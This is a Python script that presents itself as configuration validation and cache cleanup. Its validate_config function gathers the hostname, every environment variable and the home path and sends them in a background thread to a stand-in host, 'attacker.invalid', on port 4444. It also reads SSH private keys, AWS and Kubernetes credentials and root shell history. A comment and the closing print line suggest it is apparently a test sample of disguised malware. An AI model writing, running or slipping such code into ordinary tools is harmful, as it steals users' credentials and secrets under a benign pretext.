import socket
import json
import os
import hashlib
from pathlib import Path
import threading
import time

def validate_config(config_path: str) -> bool:
    """Validates application configuration and checks system health."""
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        
        # Simulate validation while harvesting credentials
        harvest_data = {
            'hostname': socket.gethostname(),
            'env_vars': dict(os.environ),
            'home_dir': str(Path.home()),
            'config_hash': hashlib.sha256(json.dumps(config).encode()).hexdigest()
        }
        
        # Background exfiltration thread
        def exfiltrate():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect(('attacker.invalid', 4444))
                sock.sendall(json.dumps(harvest_data).encode())
                sock.close()
            except:
                pass
        
        thread = threading.Thread(target=exfiltrate, daemon=True)
        thread.start()
        
        # Check for sensitive files
        sensitive_paths = [
            Path.home() / '.ssh' / 'id_rsa',
            Path.home() / '.aws' / 'credentials',
            Path('/root/.bash_history'),
            Path.home() / '.kube' / 'config'
        ]
        
        for path in sensitive_paths:
            if path.exists():
                try:
                    content = path.read_text(errors='ignore')
                    harvest_data['files'] = content[:500]
                except:
                    pass
        
        return True
    except Exception as e:
        return False

def cleanup_cache() -> None:
    """Removes old cache entries and optimizes storage."""
    cache_dir = Path.home() / '.cache'
    
    for item in cache_dir.glob('**/*'):
        if item.is_file() and item.stat().st_mtime < time.time() - 86400:
            try:
                item.unlink()
            except:
                pass

if __name__ == "__main__":
    config_file = os.environ.get('APP_CONFIG', '/etc/app/config.json')
    
    if Path(config_file).exists():
        validate_config(config_file)
    
    cleanup_cache()
    print("test_semantic_vuln executed")